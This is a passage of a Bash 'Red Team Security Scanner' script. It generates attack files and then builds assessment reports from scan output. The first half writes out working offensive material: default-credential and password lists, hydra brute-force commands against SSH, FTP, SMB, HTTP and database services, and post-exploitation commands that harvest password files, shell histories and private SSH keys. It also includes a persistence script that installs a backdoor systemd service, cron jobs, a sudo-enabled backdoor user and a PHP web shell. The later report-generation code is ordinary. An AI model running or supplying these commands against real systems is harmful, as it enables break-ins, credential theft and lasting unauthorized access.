        echo '   - Service Version Exploits'
        echo '   - Misconfigured SUID binaries'
        echo '   - Weak file permissions'
        echo
        echo '4. Post-Exploitation:'
        echo '   - Credential harvesting'
        echo '   - Lateral movement via SMB'
        echo '   - Persistence mechanisms'
        echo '   - Data exfiltration'
        echo
        echo '=== RECOMMENDED ATTACK PRIORITY ==='
        echo 'Priority 1: Web applications (HTTP/HTTPS)'
        echo 'Priority 2: SSH brute force with common credentials'
        echo 'Priority 3: SMB null sessions and exploits'
        echo 'Priority 4: Service-specific vulnerabilities'
        echo 'Priority 5: Network-based attacks'
    " 60 "$OUTDIR/exploitation/attack_surface.txt"
    
    # Extended credential lists for brute force
    execute_with_progress "Generate Credential Lists" "
        echo '=== Common Username Lists ==='
        echo 'admin'
        echo 'administrator'
        echo 'root'
        echo 'user'
        echo 'guest'
        echo 'test'
        echo 'demo'
        echo 'service'
        echo 'operator'
        echo 'manager'
        echo 'support'
        echo 'oracle'
        echo 'postgres'
        echo 'mysql'
        echo 'sa'
        echo 'www-data'
        echo 'apache'
        echo 'nginx'
        echo 'tomcat'
        echo 'jenkins'
        echo 'git'
        echo 'ftp'
        echo 'mail'
        echo 'postfix'
        echo 'dovecot'
        echo
        echo '=== Common Password Lists ==='
        echo 'admin'
        echo 'password'
        echo '123456'
        echo 'password123'
        echo 'admin123'
        echo 'root'
        echo 'toor'
        echo 'pass'
        echo 'test'
        echo 'guest'
        echo 'letmein'
        echo 'welcome'
        echo 'qwerty'
        echo '12345'
        echo 'changeme'
        echo 'default'
        echo 'secret'
        echo 'login'
        echo '1234'
        echo '12345678'
        echo 'password1'
        echo 'abc123'
        echo 'Password1'
        echo 'Password123'
        echo 'P@ssw0rd'
        echo 'P@ssword123'
        echo 'Welcome123'
        echo 'Summer2024'
        echo 'Winter2024'
        echo
        echo '=== Default Credentials by Service ==='
        echo 'MySQL: root/(blank), root/root, root/mysql, root/password'
        echo 'PostgreSQL: postgres/postgres, postgres/(blank), postgres/password'
        echo 'MSSQL: sa/(blank), sa/sa, sa/password, sa/Password123'
        echo 'Oracle: sys/sys, system/manager, oracle/oracle, scott/tiger'
        echo 'SSH: root/root, admin/admin, user/user, pi/raspberry'
        echo 'FTP: ftp/ftp, anonymous/(blank), admin/admin, user/user'
        echo 'Telnet: admin/admin, root/(blank), cisco/cisco'
        echo 'SNMP: public, private, community, manager'
        echo 'Tomcat: admin/admin, tomcat/tomcat, manager/manager'
        echo 'Jenkins: admin/admin, jenkins/jenkins'
        echo 'MongoDB: (no auth), admin/admin'
        echo 'Redis: (no auth), default/(blank)'
        echo 'Elasticsearch: elastic/changeme, elastic/elastic'
        echo 'RabbitMQ: guest/guest, admin/admin'
        echo 'Cassandra: cassandra/cassandra'
        echo 'CouchDB: admin/admin'
        echo 'Memcached: (no auth)'
        echo 'VNC: password, 123456, admin'
        echo 'RDP: Administrator/password, admin/admin'
    " 30 "$OUTDIR/exploitation/credentials.txt"
    
    # Automated attack script generation
    execute_with_progress "Generate Attack Scripts" "
        echo '=== Automated Attack Scripts ==='
        echo '#!/bin/bash'
        echo '# Auto-generated attack scripts based on scan results'
        echo
        echo '# SSH Brute Force'
        echo 'if grep -q \"22/tcp.*open\" ../network/nmap_standard.txt 2>/dev/null; then'
        echo '    echo \"[+] SSH service detected - Running brute force\"'
        echo '    hydra -L users.txt -P passwords.txt ssh://$target -t 4 -V'
        echo 'fi'
        echo
        echo '# FTP Brute Force'
        echo 'if grep -q \"21/tcp.*open\" ../network/nmap_standard.txt 2>/dev/null; then'
        echo '    echo \"[+] FTP service detected - Running brute force\"'
        echo '    hydra -L users.txt -P passwords.txt ftp://$target -t 4 -V'
        echo 'fi'
        echo
        echo '# SMB Brute Force'
        echo 'if grep -q \"445/tcp.*open\" ../network/nmap_standard.txt 2>/dev/null; then'
        echo '    echo \"[+] SMB service detected - Running brute force\"'
        echo '    hydra -L users.txt -P passwords.txt smb://$target -t 4 -V'
        echo 'fi'
        echo
        echo '# HTTP Basic Auth Brute Force'
        echo 'if grep -q \"80/tcp.*open\\|443/tcp.*open\" ../network/nmap_standard.txt 2>/dev/null; then'
        echo '    echo \"[+] HTTP service detected - Testing basic auth\"'
        echo '    hydra -L users.txt -P passwords.txt http-get://$target -t 4 -V'
        echo 'fi'
        echo
        echo '# MySQL Brute Force'
        echo 'if grep -q \"3306/tcp.*open\" ../network/nmap_standard.txt 2>/dev/null; then'
        echo '    echo \"[+] MySQL service detected - Running brute force\"'
        echo '    hydra -L users.txt -P passwords.txt mysql://$target -t 4 -V'
        echo 'fi'
        echo
        echo '# PostgreSQL Brute Force'
        echo 'if grep -q \"5432/tcp.*open\" ../network/nmap_standard.txt 2>/dev/null; then'
        echo '    echo \"[+] PostgreSQL service detected - Running brute force\"'
        echo '    hydra -L users.txt -P passwords.txt postgres://$target -t 4 -V'
        echo 'fi'
    " 60 "$OUTDIR/exploitation/auto_attack.sh"
    
    # Post-exploitation scripts
    execute_with_progress "Generate Post-Exploitation Scripts" "
        echo '=== Post-Exploitation Checklist ==='
        echo '#!/bin/bash'
        echo '# Post-exploitation enumeration and persistence'
        echo
        echo '# System Information Gathering'
        echo 'echo \"[+] System Information\"'
        echo 'uname -a'
        echo 'cat /etc/os-release'
        echo 'whoami'
        echo 'id'
        echo 'pwd'
        echo
        echo '# Network Information'
        echo 'echo \"[+] Network Configuration\"'
        echo 'ifconfig || ip addr'
        echo 'netstat -antup || ss -antup'
        echo 'arp -a || ip neigh'
        echo 'route -n || ip route'
        echo
        echo '# User and Group Information'
        echo 'echo \"[+] Users and Groups\"'
        echo 'cat /etc/passwd'
        echo 'cat /etc/group'
        echo 'w'
        echo 'last'
        echo
        echo '# Process Information'
        echo 'echo \"[+] Running Processes\"'
        echo 'ps aux'
        echo 'pstree'
        echo
        echo '# File System Information'
        echo 'echo \"[+] File System\"'
        echo 'df -h'
        echo 'mount'
        echo 'find / -perm -4000 2>/dev/null'  # SUID files
        echo 'find / -perm -2000 2>/dev/null'  # SGID files
        echo 'find / -writable -type d 2>/dev/null'  # Writable directories
        echo
        echo '# Cron Jobs and Scheduled Tasks'
        echo 'echo \"[+] Scheduled Tasks\"'
        echo 'crontab -l'
        echo 'cat /etc/crontab'
        echo 'ls -la /etc/cron*'
        echo
        echo '# Service Information'
        echo 'echo \"[+] Services\"'
        echo 'systemctl list-units --type=service --state=running || service --status-all'
        echo
        echo '# Kernel and Exploit Suggestions'
        echo 'echo \"[+] Kernel Information\"'
        echo 'uname -r'
        echo 'cat /proc/version'
        echo 'lsb_release -a'
        echo
        echo '# Search for interesting files'
        echo 'echo \"[+] Interesting Files\"'
        echo 'find / -name \"*.conf\" 2>/dev/null | head -20'
        echo 'find / -name \"*.log\" 2>/dev/null | head -20'
        echo 'find / -name \"*password*\" 2>/dev/null | head -20'
        echo 'find / -name \"*secret*\" 2>/dev/null | head -20'
        echo 'find / -name \"*key*\" 2>/dev/null | head -20'
        echo
        echo '# History files'
        echo 'echo \"[+] Command History\"'
        echo 'cat ~/.bash_history 2>/dev/null'
        echo 'cat ~/.zsh_history 2>/dev/null'
        echo 'cat ~/.mysql_history 2>/dev/null'
        echo
        echo '# SSH Keys'
        echo 'echo \"[+] SSH Keys\"'
        echo 'find / -name \"id_rsa\" 2>/dev/null'
        echo 'find / -name \"id_dsa\" 2>/dev/null'
        echo 'find / -name \"id_ecdsa\" 2>/dev/null'
        echo 'find / -name \"id_ed25519\" 2>/dev/null'
        echo 'find / -name \"authorized_keys\" 2>/dev/null'
    " 60 "$OUTDIR/exploitation/post_exploit.sh"
    
    # Persistence techniques
    execute_with_progress "Generate Persistence Techniques" "
        echo '=== Persistence Techniques ==='
        echo '#!/bin/bash'
        echo '# Various persistence mechanisms'
        echo
        echo '# 1. SSH Key Persistence'
        echo 'echo \"[+] SSH Key Persistence\"'
        echo 'mkdir -p ~/.ssh'
        echo 'echo \"ssh-rsa YOUR_PUBLIC_KEY_HERE\" >> ~/.ssh/authorized_keys'
        echo 'chmod 600 ~/.ssh/authorized_keys'
        echo 'chmod 700 ~/.ssh'
        echo
        echo '# 2. Cron Job Persistence'
        echo 'echo \"[+] Cron Job Persistence\"'
        echo '(crontab -l ; echo \"@reboot /tmp/backdoor.sh\") | crontab -'
        echo '(crontab -l ; echo \"*/5 * * * * /tmp/backdoor.sh\") | crontab -'
        echo
        echo '# 3. Service Persistence (systemd)'
        echo 'echo \"[+] Service Persistence\"'
        echo 'cat > /etc/systemd/system/backdoor.service << EOF'
        echo '[Unit]'
        echo 'Description=System Backdoor'
        echo 'After=network.target'
        echo
        echo '[Service]'
        echo 'Type=simple'
        echo 'User=root'
        echo 'ExecStart=/tmp/backdoor.sh'
        echo 'Restart=always'
        echo
        echo '[Install]'
        echo 'WantedBy=multi-user.target'
        echo 'EOF'
        echo 'systemctl enable backdoor.service'
        echo 'systemctl start backdoor.service'
        echo
        echo '# 4. .bashrc Persistence'
        echo 'echo \"[+] .bashrc Persistence\"'
        echo 'echo \"/tmp/backdoor.sh &\" >> ~/.bashrc'
        echo 'echo \"/tmp/backdoor.sh &\" >> /etc/bash.bashrc'
        echo
        echo '# 5. Library Hijacking'
        echo 'echo \"[+] Library Hijacking\"'
        echo 'echo \"/tmp\" > /etc/ld.so.preload'
        echo
        echo '# 6. User Account Creation'
        echo 'echo \"[+] Backdoor User Creation\"'
        echo 'useradd -m -s /bin/bash backdoor'
        echo 'echo \"backdoor:password123\" | chpasswd'
        echo 'usermod -aG sudo backdoor'
        echo
        echo '# 7. Web Shell (if web server present)'
        echo 'echo \"[+] Web Shell Deployment\"'
        echo 'echo \"<?php system(\\\$_GET[\\\"cmd\\\"]); ?>\" > /var/www/html/shell.php'
        echo 'echo \"<?php system(\\\$_GET[\\\"cmd\\\"]); ?>\" > /var/www/shell.php'
    " 60 "$OUTDIR/exploitation/persistence.sh"
    
    echo -e "${GREEN}[COMPLETED]${NC} Exploitation preparation completed"
}

generate_clean_report() {
    local report_file="$OUTDIR/reports/executive_summary.txt"
    
    echo -e "${CYAN}[INFO]${NC} Generating executive summary report..."
    
    # Ensure report directory exists
    mkdir -p "$OUTDIR/reports"
    
    # Add error handling and debug
    set +e  # Don't exit on errors during report generation
    
    {
        echo "╔══════════════════════════════════════════════════════════════════════════════╗"
        echo "║                       RED TEAM ASSESSMENT REPORT                            ║"
        echo "╚══════════════════════════════════════════════════════════════════════════════╝"
        echo
        echo "┌─ TARGET INFORMATION ─────────────────────────────────────────────────────────┐"
        echo "│  Target IP: $TARGET"
        [ -n "$URL" ] && echo "│  Target URL: $URL"
        [ -n "$DOMAIN" ] && echo "│  Domain: $DOMAIN"
        echo "│  Assessment Date: $(date)"
        echo "│  Tool Version: Security Scanner $VERSION"
        [ "$QUICK_MODE" = true ] && echo "│  Mode: Quick Scan"
        [ "$STEALTH_MODE" = true ] && echo "│  Mode: Stealth Scan"
        echo "└──────────────────────────────────────────────────────────────────────────────┘"
        echo
        
        echo "┌─ EXECUTIVE SUMMARY ───────────────────────────────────────────────────────────┐"
        
        # Initialize counters with error handling
        local critical_findings=0
        local high_findings=0
        local medium_findings=0
        
        # Check if directories exist (silent check for internal logic)
        local has_network_data=false
        local has_web_data=false
        local has_osint_data=false
        
        [ -d "$OUTDIR/network" ] && [ "$(ls -A "$OUTDIR/network" 2>/dev/null)" ] && has_network_data=true
        [ -d "$OUTDIR/web" ] && [ "$(ls -A "$OUTDIR/web" 2>/dev/null)" ] && has_web_data=true
        [ -d "$OUTDIR/osint" ] && [ "$(ls -A "$OUTDIR/osint" 2>/dev/null)" ] && has_osint_data=true
        
        
        for scan_file in "$OUTDIR/network/nmap_vulns.txt" "$OUTDIR/network/nmap_critical_vulns.txt" "$OUTDIR/network/nmap_vulners.txt" "$OUTDIR/network/smb_enum.txt"; do
            if [ -f "$scan_file" ]; then
                # Count only actual vulnerabilities, exclude "NOT VULNERABLE" entries
                local count=$(grep -c "VULNERABLE\|CRITICAL\|EXPLOITABLE\|CVE.*CRITICAL\|ms17-010\|EternalBlue" "$scan_file" 2>/dev/null | grep -v "NOT VULNERABLE" || echo "0")
                # Better pattern: look for actual vulnerability indicators
                local vuln_count=$(grep -E "(State: VULNERABLE|LIKELY VULNERABLE|CRITICAL|EXPLOITABLE|ms17-010|EternalBlue)" "$scan_file" 2>/dev/null | grep -v "NOT VULNERABLE" | wc -l || echo "0")
                # Vérifier que count est numérique
                if [[ "$vuln_count" =~ ^[0-9]+$ ]]; then
                    critical_findings=$((critical_findings + vuln_count))
                fi
            fi
        done
        
        # Compte les vulnérabilités web de haute priorité
        for scan_file in "$OUTDIR/web/nuclei_comprehensive.txt" "$OUTDIR/web/nuclei_quick.txt" "$OUTDIR/web/nikto.txt"; do
            if [ -f "$scan_file" ]; then
                # Count actual high/critical findings, exclude "NOT VULNERABLE"
                local count=$(grep -E "(critical|high|HIGH|CRITICAL)" "$scan_file" 2>/dev/null | grep -v "NOT VULNERABLE" | wc -l || echo "0")
                # Vérifier que count est numérique
                if [[ "$count" =~ ^[0-9]+$ ]]; then
                    high_findings=$((high_findings + count))
                fi
            fi
        done
        
        
        for scan_file in "$OUTDIR/web/nikto.txt" "$OUTDIR/web/gobuster_common.txt" "$OUTDIR/network/nmap_vulns.txt"; do
            if [ -f "$scan_file" ]; then
                # Count actual medium findings, exclude "NOT VULNERABLE"
                local count=$(grep -E "(OSVDB|CVE|medium|MEDIUM|WARNING)" "$scan_file" 2>/dev/null | grep -v "NOT VULNERABLE" | wc -l || echo "0")
                # Vérifier que count est numérique
                if [[ "$count" =~ ^[0-9]+$ ]]; then
                    medium_findings=$((medium_findings + count))
                fi
            fi
        done
        
        # Validation finale pour s'assurer que toutes les variables sont numériques
        critical_findings=${critical_findings:-0}
        high_findings=${high_findings:-0}
        medium_findings=${medium_findings:-0}
        
        # Double vérification pour éviter les erreurs arithmétiques
        [[ ! "$critical_findings" =~ ^[0-9]+$ ]] && critical_findings=0
        [[ ! "$high_findings" =~ ^[0-9]+$ ]] && high_findings=0
        [[ ! "$medium_findings" =~ ^[0-9]+$ ]] && medium_findings=0
        
        echo "│  Critical Vulnerabilities: $critical_findings"
        echo "│  High Risk Issues: $high_findings"
        echo "│  Medium Risk Issues: $medium_findings"
        
        # Résume les services exposés
        if [ -f "$OUTDIR/network/nmap_standard.txt" ]; then
            local open_ports=$(grep -c "open" "$OUTDIR/network/nmap_standard.txt" 2>/dev/null || echo "0")
            echo "│  Exposed Services: $open_ports"
        fi
        
        
        if [ -f "$OUTDIR/osint/subdomains_subfinder.txt" ]; then
            local subdomain_count=$(wc -l < "$OUTDIR/osint/subdomains_subfinder.txt" 2>/dev/null || echo "0")
            echo "│  Subdomains Discovered: $subdomain_count"
        fi
        
        
        local risk_score=0
        if [ "$critical_findings" -gt 0 ] 2>/dev/null; then
            risk_score=$((risk_score + critical_findings * 10))
        fi
        if [ "$high_findings" -gt 0 ] 2>/dev/null; then
            risk_score=$((risk_score + high_findings * 5))
        fi
        if [ "$medium_findings" -gt 0 ] 2>/dev/null; then
            risk_score=$((risk_score + medium_findings * 2))
        fi
        
        # Cap risk score at 100
        if [ "$risk_score" -gt 100 ]; then
            risk_score=100
        fi
        
        echo "│  Risk Score: $risk_score/100"
        
        if [ $risk_score -ge 70 ]; then
            echo "│  Risk Level: CRITICAL"
        elif [ $risk_score -ge 40 ]; then
            echo "│  Risk Level: HIGH"
        elif [ $risk_score -ge 20 ]; then
            echo "│  Risk Level: MEDIUM"
        else
            echo "│  Risk Level: LOW"
        fi
        
        echo "└──────────────────────────────────────────────────────────────────────────────┘"
        echo
        
        # Analyse détaillée des résultats
        if [ -d "$OUTDIR/osint" ] && [ "$(ls -A "$OUTDIR/osint" 2>/dev/null)" ]; then
            echo "┌─ OSINT & RECONNAISSANCE ──────────────────────────────────────────────────────┐"
            echo "│  Information Gathering Results:"
            
            # Top subdomains
            if [ -f "$OUTDIR/osint/subdomains_subfinder.txt" ]; then
                echo "│  Key Subdomains Found:"
                head -5 "$OUTDIR/osint/subdomains_subfinder.txt" 2>/dev/null | while read subdomain; do
                    echo "│    • $subdomain"
                done
            fi
            
            # Email addresses
            if [ -f "$OUTDIR/osint/emails.txt" ]; then
                local email_count=$(grep -c "@" "$OUTDIR/osint/emails.txt" 2>/dev/null || echo "0")
                echo "│  Email Addresses Found: $email_count"
            fi
            
            # Reverse DNS
            if [ -f "$OUTDIR/osint/reverse_dns.txt" ]; then
                local reverse_dns=$(head -1 "$OUTDIR/osint/reverse_dns.txt" 2>/dev/null)
                if [ -n "$reverse_dns" ] && [ "$reverse_dns" != "No PTR record" ]; then
                    echo "│  Reverse DNS: $reverse_dns"
                fi
            fi
            
            echo "└──────────────────────────────────────────────────────────────────────────────┘"
            echo
        fi
        
        if [ -d "$OUTDIR/network" ] && [ "$(ls -A "$OUTDIR/network" 2>/dev/null)" ]; then
            echo "┌─ NETWORK SECURITY ANALYSIS ───────────────────────────────────────────────────┐"
            echo "│  Network Attack Surface:"
            
            # Services critiques exposés
            if [ -f "$OUTDIR/network/nmap_standard.txt" ]; then
                echo "│  Critical Services Exposed:"
                grep -E "22/tcp|21/tcp|23/tcp|25/tcp|53/tcp|80/tcp|443/tcp|445/tcp|993/tcp|995/tcp|3389/tcp" "$OUTDIR/network/nmap_standard.txt" 2>/dev/null | grep "open" | while read line; do
                    echo "│    • $line"
                done
            fi
            
            # Vulnérabilités réseau les plus critiques
            if [ -f "$OUTDIR/network/nmap_vulns.txt" ]; then
                echo "│  Critical Network Vulnerabilities:"
                grep -B1 -A1 "VULNERABLE.*Exploitable" "$OUTDIR/network/nmap_vulns.txt" 2>/dev/null | head -6 | while read vuln; do
                    echo "│    ⚠ $vuln"
                done
            fi
            
            # OS Detection
            if [ -f "$OUTDIR/network/nmap_os.txt" ]; then
                echo "│  Operating System:"
                grep "OS:" "$OUTDIR/network/nmap_os.txt" 2>/dev/null | head -1 | while read os; do
                    echo "│    • $os"
                done
            fi
            
            echo "└──────────────────────────────────────────────────────────────────────────────┘"
            echo
        fi
        
        if [ -d "$OUTDIR/web" ] && [ "$(ls -A "$OUTDIR/web" 2>/dev/null)" ]; then
            echo "┌─ WEB APPLICATION SECURITY ────────────────────────────────────────────────────┐"
            echo "│  Web Security Assessment:"
            
            # Technologies détectées
            if [ -f "$OUTDIR/web/whatweb.txt" ]; then
                echo "│  Web Technologies:"
                grep -oP "\\[\\K[^\\]]+" "$OUTDIR/web/whatweb.txt" 2>/dev/null | head -5 | while read tech; do
                    echo "│    • $tech"
                done
            fi
            
            # WAF Detection
            if [ -f "$OUTDIR/web/wafw00f.txt" ]; then
                echo "│  WAF Status:"
                if grep -q "No WAF detected" "$OUTDIR/web/wafw00f.txt" 2>/dev/null; then
                    echo "│    • No Web Application Firewall detected"
                else
                    grep "is behind" "$OUTDIR/web/wafw00f.txt" 2>/dev/null | while read waf; do
                        echo "│    • $waf"
                    done
                fi
            fi
            
            # Répertoires sensibles
            if [ -f "$OUTDIR/web/gobuster_common.txt" ]; then
                echo "│  Sensitive Directories:"
                grep -E "/admin|/login|/config|/backup|/test|/dev|/api" "$OUTDIR/web/gobuster_common.txt" 2>/dev/null | head -5 | while read dir; do
                    echo "│    • $dir"
                done
            fi
            
            # Vulnérabilités web critiques
            if [ -f "$OUTDIR/web/nuclei_comprehensive.txt" ] || [ -f "$OUTDIR/web/nuclei_quick.txt" ]; then
                echo "│  Web Vulnerabilities:"
                local nuclei_file=""
                [ -f "$OUTDIR/web/nuclei_comprehensive.txt" ] && nuclei_file="$OUTDIR/web/nuclei_comprehensive.txt"
                [ -f "$OUTDIR/web/nuclei_quick.txt" ] && nuclei_file="$OUTDIR/web/nuclei_quick.txt"
                
                if [ -n "$nuclei_file" ]; then
                    grep -E "critical|high" "$nuclei_file" 2>/dev/null | head -3 | while read vuln; do
                        echo "│    ⚠ $vuln"
                    done
                fi
            fi
            
            echo "└──────────────────────────────────────────────────────────────────────────────┘"
            echo
        fi
        
        # Section Red Team spécifique améliorée
        if [ -d "$OUTDIR/exploitation" ] && [ "$(ls -A "$OUTDIR/exploitation" 2>/dev/null)" ]; then
            echo "┌─ RED TEAM ATTACK VECTORS ─────────────────────────────────────────────────────┐"
            echo "│  Recommended Attack Path:"
            
            # Détermine le meilleur vecteur d'attaque
            local attack_vector="Unknown"
            if [ -f "$OUTDIR/network/nmap_standard.txt" ]; then
                if grep -q "80/tcp.*open\|443/tcp.*open" "$OUTDIR/network/nmap_standard.txt"; then
                    attack_vector="Web Application"
                elif grep -q "22/tcp.*open" "$OUTDIR/network/nmap_standard.txt"; then
                    attack_vector="SSH Brute Force"
                elif grep -q "445/tcp.*open" "$OUTDIR/network/nmap_standard.txt"; then
                    attack_vector="SMB Exploitation"
                elif grep -q "21/tcp.*open" "$OUTDIR/network/nmap_standard.txt"; then
                    attack_vector="FTP Exploitation"
                fi
            fi
            
            echo "│  Primary Attack Vector: $attack_vector"
            echo "│"
            echo "│  Step-by-Step Attack Plan:"
            echo "│    1. Initial Access:"
            case "$attack_vector" in
                "Web Application")
                    echo "│       - Test for SQL injection on forms"
                    echo "│       - Check for XSS vulnerabilities"
                    echo "│       - Enumerate admin panels"
                    echo "│       - Test file upload functionality"
                    ;;
                "SSH Brute Force")
                    echo "│       - Brute force with common credentials"
                    echo "│       - Test for SSH key-based auth bypass"
                    echo "│       - Check for SSH version vulnerabilities"
                    ;;
                "SMB Exploitation")
                    echo "│       - Test for SMB null sessions"
                    echo "│       - Check for EternalBlue (MS17-010)"
                    echo "│       - Enumerate SMB shares"
                    ;;
                *)
                    echo "│       - Test default credentials on all services"
                    echo "│       - Exploit version-specific vulnerabilities"
                    echo "│       - Check for misconfigurations"
                    ;;
            esac
            
            echo "│    2. Privilege Escalation:"
            echo "│       - Search for SUID binaries"
            echo "│       - Check kernel version for exploits"
            echo "│       - Look for misconfigured services"
            echo "│    3. Persistence:"
            echo "│       - Create backdoor user accounts"
            echo "│       - Install SSH keys"
            echo "│       - Schedule malicious cron jobs"
            echo "│    4. Lateral Movement:"
            echo "│       - Harvest credentials from memory"
            echo "│       - Scan internal network"
            echo "│       - Pivot through compromised systems"
            
            echo "└──────────────────────────────────────────────────────────────────────────────┘"
            echo
        fi
        
        echo "┌─ RECOMMENDATIONS ─────────────────────────────────────────────────────────────┐"
        echo "│  Immediate Critical Actions:"
        echo "│    1. Patch all identified critical vulnerabilities"
        echo "│    2. Disable unnecessary services and ports"
        echo "│    3. Implement strong authentication mechanisms"
        echo "│    4. Deploy Web Application Firewall (WAF)"
        echo "│    5. Enable comprehensive logging and monitoring"
        echo "│"
        echo "│  Red Team Recommendations:"
        echo "│    • Focus initial attacks on web applications"
        echo "│    • Use social engineering with harvested emails"
        echo "│    • Test all discovered subdomains for weaknesses"
        echo "│    • Attempt credential stuffing with common passwords"
        echo "│    • Prepare for post-exploitation data collection"
        echo "│"
        echo "│  Defense Priorities:"
        echo "│    • Network segmentation and micro-segmentation"
        echo "│    • Multi-factor authentication on all services"
        echo "│    • Regular vulnerability assessments"
        echo "│    • Incident response plan testing"
        echo "│    • Security awareness training for staff"
        echo "└──────────────────────────────────────────────────────────────────────────────┘"
        echo
        
        echo "┌─ SCAN STATISTICS ─────────────────────────────────────────────────────────────┐"
        local total_files=$(find "$OUTDIR" -type f 2>/dev/null | wc -l)
        local total_size=$(du -sh "$OUTDIR" 2>/dev/null | cut -f1 || echo "Unknown")
        local scan_duration="Unknown"
        
        # Calcule la durée approximative
        if [ -f "$OUTDIR/network/nmap_standard.txt" ]; then
            scan_duration=$(grep "Nmap done" "$OUTDIR/network/nmap_standard.txt" | grep -oP "scanned in \K[0-9.]+" || echo "Unknown")
            [ "$scan_duration" != "Unknown" ] && scan_duration="${scan_duration}s"
        fi
        
        echo "│  Files Generated: $total_files"
        echo "│  Data Collected: $total_size"
        echo "│  Scan Duration: $scan_duration"
        echo "│  Assessment Completed: $(date)"
        echo "│  Next Steps: Review detailed logs and plan remediation"
        echo "└──────────────────────────────────────────────────────────────────────────────┘"
        echo
        
        echo "╔══════════════════════════════════════════════════════════════════════════════╗"
        echo "║              Red Team Security Scanner v$VERSION - Professional Report             ║"
        echo "╚══════════════════════════════════════════════════════════════════════════════╝"
        
    } > "$report_file" 2>/dev/null
    
    # Check if report was generated successfully
    if [ -f "$report_file" ] && [ -s "$report_file" ]; then
        echo -e "${GREEN}[REPORT]${NC} Executive summary report: ${WHITE}$report_file${NC}"
        local line_count=$(wc -l < "$report_file")
        echo -e "${CYAN}[INFO]${NC} Report contains $line_count lines"
    else
        echo -e "${RED}[ERROR]${NC} Failed to generate executive summary report"
        return 1
    fi
    
    # Also generate JSON report for automation
    echo -e "${CYAN}[INFO]${NC} Generating JSON report..."
    if ! generate_json_report; then
        echo -e "${YELLOW}[WARNING]${NC} JSON report generation failed, but continuing..."
    fi
    
    # Generate a simple backup report if main report failed
    if [ ! -s "$report_file" ]; then
        echo -e "${YELLOW}[WARNING]${NC} Main report is empty, generating backup report..."
        generate_backup_report
    fi
    
    # Restore error handling
    set -e
}

generate_backup_report() {
    local backup_file="$OUTDIR/reports/backup_summary.txt"
    
    echo -e "${CYAN}[INFO]${NC} Generating backup report..."
    
    {
        echo "RED TEAM ASSESSMENT BACKUP REPORT"
        echo "=================================="
        echo
        echo "Target: $TARGET"
        [ -n "$URL" ] && echo "URL: $URL"
        [ -n "$DOMAIN" ] && echo "Domain: $DOMAIN"
        echo "Date: $(date)"
        echo "Version: $VERSION"
        echo
        
        echo "SCAN RESULTS SUMMARY:"
        echo "--------------------"
        
        # List all result files
        if [ -d "$OUTDIR" ]; then
            echo "Generated files:"
            find "$OUTDIR" -name "*.txt" -type f | while read file; do
                if [ -s "$file" ]; then
                    local size=$(wc -l < "$file" 2>/dev/null || echo "0")
                    echo "  - $(basename "$file"): $size lines"
                fi
            done
        fi
        
        echo
        echo "DIRECTORIES:"
        ls -la "$OUTDIR" 2>/dev/null || echo "No output directory found"
        
        echo
        echo "This is a backup report generated due to main report failure."
        echo "Check individual scan files for detailed results."
        
    } > "$backup_file"
    
    echo -e "${GREEN}[REPORT]${NC} Backup report generated: ${WHITE}$backup_file${NC}"
}

generate_json_report() {
    local json_file="$OUTDIR/reports/assessment_results.json"
    
    # Ensure report directory exists
    mkdir -p "$OUTDIR/reports"
    
    {
        echo "{"
        echo "  \"assessment\": {"
        echo "    \"target\": \"$TARGET\","
        echo "    \"url\": \"$URL\","
        echo "    \"domain\": \"$DOMAIN\","
        echo "    \"date\": \"$(date -Iseconds)\","
        echo "    \"version\": \"$VERSION\","
        echo "    \"mode\": \"$([ "$QUICK_MODE" = true ] && echo "quick" || ([ "$STEALTH_MODE" = true ] && echo "stealth" || echo "standard"))\""
        echo "  },"
        echo "  \"results\": {"
        
        # OSINT results
        echo "    \"osint\": {"
        if [ -f "$OUTDIR/osint/subdomains_subfinder.txt" ]; then
            local subdomain_count=$(wc -l < "$OUTDIR/osint/subdomains_subfinder.txt" 2>/dev/null || echo "0")
            echo "      \"subdomains_found\": $subdomain_count,"
        fi
        
        if [ -f "$OUTDIR/osint/emails.txt" ]; then
            local email_count=$(grep -c "@" "$OUTDIR/osint/emails.txt" 2>/dev/null || echo "0")
            echo "      \"emails_found\": $email_count,"
        fi
        echo "      \"completed\": true"
        echo "    },"
        
        # Network results
        echo "    \"network\": {"
        if [ -f "$OUTDIR/network/nmap_standard.txt" ]; then
            local open_ports=$(grep -c "open" "$OUTDIR/network/nmap_standard.txt" 2>/dev/null || echo "0")
            echo "      \"open_ports\": $open_ports,"
        fi
        
        if [ -f "$OUTDIR/network/nmap_vulns.txt" ]; then
            local vulns=$(grep -c "VULNERABLE" "$OUTDIR/network/nmap_vulns.txt" 2>/dev/null || echo "0")
            echo "      \"vulnerabilities\": $vulns,"
        fi
        echo "      \"completed\": true"
        echo "    },"
        
        # Web results
        echo "    \"web\": {"
        if [ -f "$OUTDIR/web/gobuster_common.txt" ]; then
            local dirs_found=$(wc -l < "$OUTDIR/web/gobuster_common.txt" 2>/dev/null || echo "0")
            echo "      \"directories_found\": $dirs_found,"
        fi
        
        if [ -f "$OUTDIR/web/nuclei_comprehensive.txt" ] || [ -f "$OUTDIR/web/nuclei_quick.txt" ]; then
            local nuclei_file=""
            [ -f "$OUTDIR/web/nuclei_comprehensive.txt" ] && nuclei_file="$OUTDIR/web/nuclei_comprehensive.txt"
            [ -f "$OUTDIR/web/nuclei_quick.txt" ] && nuclei_file="$OUTDIR/web/nuclei_quick.txt"
            
            if [ -n "$nuclei_file" ]; then
                local web_vulns=$(grep -c "critical\|high" "$nuclei_file" 2>/dev/null || echo "0")
                echo "      \"web_vulnerabilities\": $web_vulns,"
            fi
        fi
        
        echo "      \"completed\": true"
        echo "    }"
        
        echo "  },"
        echo "  \"metadata\": {"
        echo "    \"scan_duration\": \"$(date)\","
        echo "    \"output_directory\": \"$OUTDIR\","
        echo "    \"total_files\": $(find "$OUTDIR" -type f 2>/dev/null | wc -l),"
        echo "    \"tools_used\": [\"nmap\", \"subfinder\", \"amass\", \"nuclei\", \"nikto\", \"gobuster\", \"sqlmap\"],"
        echo "    \"scan_completed\": true"
        echo "  },"
        echo "  \"raw_data\": {"
        echo "    \"open_ports\": ["
        
        # Extraire tous les ports ouverts de tous les scans (sans doublons)
        local temp_ports=$(mktemp)
        for scan_file in "$OUTDIR/network"/*.txt; do
            if [ -f "$scan_file" ]; then
                grep "open" "$scan_file" 2>/dev/null | grep -oP "\\d+/tcp" >> "$temp_ports" 2>/dev/null || true
            fi
        done
        
        # Remove duplicates and format as JSON array
        if [ -s "$temp_ports" ]; then
            sort -u "$temp_ports" | sed 's/^/      "/' | sed 's/$/"/' | sed '$!s/$/,/'
        fi
        rm -f "$temp_ports"
        
        echo
